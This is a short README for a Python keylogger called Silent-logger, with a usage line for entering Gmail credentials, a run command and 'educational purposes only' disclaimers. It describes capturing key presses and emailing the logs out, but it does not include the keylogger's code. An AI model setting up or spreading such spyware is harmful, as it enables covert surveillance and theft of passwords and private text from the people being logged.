# Silent-logger

A simple Python keylogger script using the pynput library. Please note that using keyloggers without proper authorization is illegal and unethical. This script is for educational purposes only, and any usage should comply with legal and ethical standards.

## Features

- Logs key presses.
- Sends logs via email.

## Usage

1. Modify the script to include your Gmail email address and password:

   ```python
   my_keylogger = Keylogger(120, "your_email@gmail.com", "your_password")
Run the script:

python keylogger.py
The keylogger will log key presses and send the logs via email at regular intervals (in seconds).

Note
The script uses the pynput library to capture key presses.
Keylogs are sent via email using a specified Gmail account.
Disclaimer
This script is provided for educational purposes only. The misuse of keyloggers is illegal and unethical. Ensure compliance with legal regulations and obtain proper authorization before using it in any environment.
